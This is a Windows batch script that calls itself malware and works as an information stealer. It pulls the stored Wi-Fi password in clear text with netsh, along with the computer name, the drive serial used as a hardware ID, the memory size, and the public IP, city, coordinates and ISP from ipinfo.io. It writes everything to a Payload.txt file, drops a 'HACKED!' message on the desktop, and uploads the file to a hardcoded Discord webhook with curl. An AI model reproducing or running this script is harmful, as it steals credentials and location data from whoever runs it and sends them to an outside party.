@echo off
setlocal enabledelayedexpansion

REM Get computer name
for /f "tokens=*" %%a in ('hostname') do set "computerName=%%a"

REM Get HWID (Volume Serial Number of the C: drive)
for /f "tokens=3" %%a in ('vol C: ^| find "Serial Number"') do set "hwid=%%a"

REM Get memory information
for /f "tokens=2 delims=:(" %%a in ('systeminfo ^| find "Total Physical Memory"') do set "memoryInfo=%%a"

REM Step 1: Get Wi-Fi SSID and password
for /f "tokens=2 delims=:" %%a in ('netsh wlan show interfaces ^| findstr "SSID"') do (
    set "ssid=%%~a"
    call :getpwd "%%ssid:~1%%"
)

REM Step 2: Get additional information
for /f %%a in ('curl -s ipinfo.io/ip') do set "publicIP=%%a"
set "city="
for /f %%a in ('curl -s ipinfo.io/city') do set "city=%%a"
set "location="
for /f %%a in ('curl -s ipinfo.io/loc') do set "location=%%a"
set "isp_asn="
for /f %%a in ('curl -s ipinfo.io/org') do set "isp_asn=%%a"
set "secondMessageFilePath=%USERPROFILE%\Desktop\message.txt"
echo HACKED!, thanks for trying the batch file malware hehe > "!secondMessageFilePath!"
set "appDataPath=%APPDATA%"
set "messageFilePath=%appDataPath%\Payload.txt"
(
    echo Wi-Fi Password: !wifiPassword!
    echo Public IP Address: !publicIP!
    echo City: !city!
    echo Location: !location!
    echo ISP/ASN: !isp_asn!
    echo Computer Name: !computerName!
    echo HWID: !hwid!
    echo Memory Info: !memoryInfo!
) > "!messageFilePath!"

REM Step 4: Send the file content to Discord webhook
set "webhookUrl=https://discord.com/api/webhooks/1169123002370240523/xBBQyD0LovnCBlKdr61PeWiv6zS8sJ9RznsB_mUEBT9TvidmnVqar_cIupsxo3QwgU79"
curl -H "Content-Type: multipart/form-data" -F "file=@!messageFilePath!" "%webhookUrl%"

echo File sent to Discord.
goto :eof

:getpwd
set "ssid=%*"
for /f "tokens=2 delims=:" %%i in ('netsh wlan show profile name^="%ssid:"=%" key^=clear ^| findstr /C:"Key Content"') do (
    set "wifiPassword=%%i"
)
goto :eof
